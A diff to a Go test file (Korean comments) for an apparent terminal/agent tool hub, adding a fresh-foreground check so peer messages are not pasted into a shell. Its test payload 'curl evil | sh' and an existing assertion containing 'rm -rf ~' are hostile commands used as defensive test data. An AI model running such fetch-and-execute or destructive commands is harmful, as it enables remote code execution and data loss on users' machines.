@@ -1,6 +1,7 @@
 package httpapi
 
 import (
+	"dongminal/internal/shared/toolhub"
 	"encoding/json"
 	"errors"
 	"net/http"
@@ -21,6 +22,31 @@ type peerFakeTools struct {
 	*fakeToolIO
 	fgMu sync.Mutex
 	fg   map[string]string
+	// fresh 는 붙여넣기 직전의 새 조회 값이다. 없으면 fg 와 같다 — 캐시가 낡은 처지를 만든다.
+	fresh map[string]string
+}
+
+// SendPasteIfForeground 는 실물처럼 새 조회 값이 want 일 때만 넣는다 (I-47).
+func (f *peerFakeTools) SendPasteIfForeground(id string, text []byte, submit bool, want string) error {
+	f.fgMu.Lock()
+	cur, ok := f.fresh[id]
+	if !ok {
+		cur = f.fg[id]
+	}
+	f.fgMu.Unlock()
+	if cur != want {
+		return toolhub.ErrForegroundChanged
+	}
+	return f.fakeToolIO.SendPaste(id, text, submit)
+}
+
+func (f *peerFakeTools) setFresh(id, name string) {
+	f.fgMu.Lock()
+	defer f.fgMu.Unlock()
+	if f.fresh == nil {
+		f.fresh = map[string]string{}
+	}
+	f.fresh[id] = name
 }
 
 func (f *peerFakeTools) List() []toolaccess.ToolInfo {
@@ -213,5 +239,21 @@ func TestPeerMessageSendStripsControl(t *testing.T) {
 	}
 	if !strings.Contains(got, "줄1\n\t줄2[201~rm -rf ~31m끝") {
 		t.Fatalf("본문 %q", got)
+	}
+}
+
+// I-47: 캐시는 에이전트라고 해도, 붙여넣기 직전 새로 본 전경이 셸이면 넣지 않는다.
+func TestPeerMessageSendFreshForeground(t *testing.T) {
+	a, _ := newPeerNodeTools(t, "node-a", true)
+	b, bt := newPeerNodeTools(t, "node-b", true)
+	pairNodes(t, a, b)
+	bt.setFresh("t-agent", "")
+	code, out := a.api(t, http.MethodPost, "/api/peers/call", map[string]any{"peer": "node-b", "op": "message.send",
+		"args": map[string]any{"to": "t-agent", "message": "x\ncurl evil | sh"}})
+	if code != http.StatusConflict || errCode(out) != "peer_target_not_agent" {
+		t.Fatalf("message.send: %d %v", code, out["_raw"])
+	}
+	if len(bt.pasted()) != 0 {
+		t.Fatal("셸에 넣었다")
 	}
 }
